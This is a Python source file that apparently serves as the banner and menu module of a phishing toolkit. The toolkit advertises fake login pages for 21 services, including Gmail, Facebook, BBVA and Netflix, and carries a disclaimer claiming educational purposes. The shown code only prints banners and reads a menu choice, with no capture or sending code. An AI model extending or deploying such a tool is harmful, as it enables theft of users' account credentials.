BANNER = """
               .--.     \033[0;38;5;172m╔╦╗┬ ┬┌─┐┬─┐┌─┐  ┬┌─┐\033[0m
             _/__  )     \033[89m║ ├─┤├┤ ├┬┘├┤   │└─┐  \033[0m
              0)0`>|_    \033[89m╩ ┴ ┴└─┘┴└─└─┘  ┴└─┘\033[0m
        /V\   \-_.-_ `;     \033[0;38;5;172m╔═╗  ┌─┐┬ ┬┬┌─┐┬ ┬┬┌┐┌┌─┐\033[0m
       /'_/\_ /_.   './     \033[89m╠═╣  ├─┘├─┤│└─┐├─┤│││││ ┬  \033[0m
      ;._ `/ ``      |      \033[89m╩ ╩  ┴  ┴ ┴┴└─┘┴ ┴┴┘└┘└─┘\033[0m
      |^ '-;._   _.' |          \033[0;38;5;172m╦ ┌┐┌  ┌┬┐┬ ┬  ╔═╗╔═╗╦ ╦╔═╗\033[0m
      |^ ^  ||```    |          \033[89m║ │││  │││└┬┘  ╚═╗║ ║║ ║╠═╝\033[0m   \033[0;38;5;29mV: 0.2.1\033[0m
    .'| ^  ^||       |          \033[89m╩ ┘└┘  ┴ ┴ ┴   ╚═╝╚═╝╚═╝╩    \033[0m\033[0;38;5;29m     2020\033[0m
   `'`|^ ^ ^|\__,.--;'      \033[91m_________________ By Neo __________________\033[0m
      | ^ ^ | |     |       \033[94m[01]\033[0m Amino      \033[94m[08]\033[0m Instagram  \033[94m[15]\033[0m Twitter
      ;^ ^ ^; |     /       \033[94m[02]\033[0m BBVA       \033[94m[09]\033[0m Lichess    \033[94m[16]\033[0m TikTok
       \^ ^/\)|    |        \033[94m[03]\033[0m Chess      \033[94m[10]\033[0m Microsoft  \033[94m[17]\033[0m Udemy
        | ^|  |    |        \033[94m[04]\033[0m Disney+    \033[94m[11]\033[0m Netflix    \033[94m[18]\033[0m Volaris
       /'-'\  \_   |        \033[94m[05]\033[0m EpicGames  \033[94m[12]\033[0m Outlook    \033[94m[19]\033[0m Wattpad
      / ..  |  |'- |        \033[94m[06]\033[0m Facebook   \033[94m[13]\033[0m Platzi     \033[94m[20]\033[0m Yahoo
      |/  `\|  |   |        \033[94m[07]\033[0m Gmail      \033[94m[14]\033[0m Reddit     \033[94m[21]\033[0m Zoom
               |   |
              _|,__|        
             (_/  .'   \033[0;38;5;160mDisclaimer: The tool is for educational purposes,\033[0m
              (_.'     \033[0;38;5;160mwe are not responsible for the misuse that may occur.\033[0m
"""


INFO = """
          \033[0;38;5;73m,-.        \033[0;38;5;112mLicence: MIT\033[0m
      O  /   \033[0;38;5;73m`.      \033[0;38;5;112mAuthor: Neo TRAN\033[0m      ":"
      <\/      \033[0;38;5;73m`.                      \033[0m  ___:____     |"\/"|
       |*        \033[0;38;5;73m`.                    \033[0m,'        `.    \  /
      / \          \033[0;38;5;73m`.                  \033[0m|  O        \___/  |
     /  / \033[0;38;5;33m~^~^~^~^~^~\033[0;38;5;73m`>')3s,\033[0;38;5;33m~^~^~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^~^~^~^~\033[0m
--------. \033[0;38;5;33m'.   ~   -    \033[0;38;5;73m` ,'\033[0;38;5;33m  ~`  ´ ' ~   `o ~~`  ´ ' ~   `o ~\033[0m
||||||||/ \033[0;38;5;33m~`    ~    `o ~\033[0;38;5;73m¿\033[0;38;5;33m   .  -    ^   ~~`  ´ ' ~   `o ~\033[0m
          \033[0;38;5;33m~`    ~    `o ~'. ~   -  `  ~~`  ´ ' ~   `o ~~`  ´ ' ~  .-  ^  ~\033[0m
   
  \033[0;38;5;94mThere is a phishing in my soup, it is a tool created with python3 using 
  the flask for the web server, and click to receive flags by terminal.
  With an academic objective, the creator of the software is not responsible
  for the misuse that may be given.

  \033[0;38;5;112mGithub: https://github.com/NeoTRAN001/ThereIsAPhishingInMySoup\033[0m

"""

OPTIONS = ['Help','Amino', 'BBVA', 'Chess', 'Disney', 'EpicGames', 'Facebook', 'Gmail']

def option():
  try:
    print(BANNER)
    op = int(input("Option: "))
    return OPTIONS[op]
  except:
    return None

def info():
  print(INFO)
